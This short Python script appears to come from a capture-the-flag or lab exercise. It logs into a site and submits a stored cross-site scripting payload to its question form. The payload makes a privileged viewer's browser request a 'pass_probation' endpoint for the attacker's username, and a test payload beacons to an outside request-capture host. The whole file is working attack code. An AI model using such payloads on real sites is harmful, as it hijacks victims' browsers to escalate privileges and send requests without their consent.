from init import login, domain, username


question_url = domain + "ask-question.php"

test = '''<script>
             var x = new XMLHttpRequest();
             x.open("GET", "https://random.free.beeceptor.com?test=0", true);
             x.send()
         </script>'''

js = f'''<script>
             var x = new XMLHttpRequest();
             x.open("GET", "http://localhost/pass_probation.php?user={username}", true);
             x.send()
         </script>'''


def xss():
    session = login()
    print("XSS to get me pass probation ...")
    payload = {"question": js}
    session.post(question_url, data=payload)
    session.close()


xss()
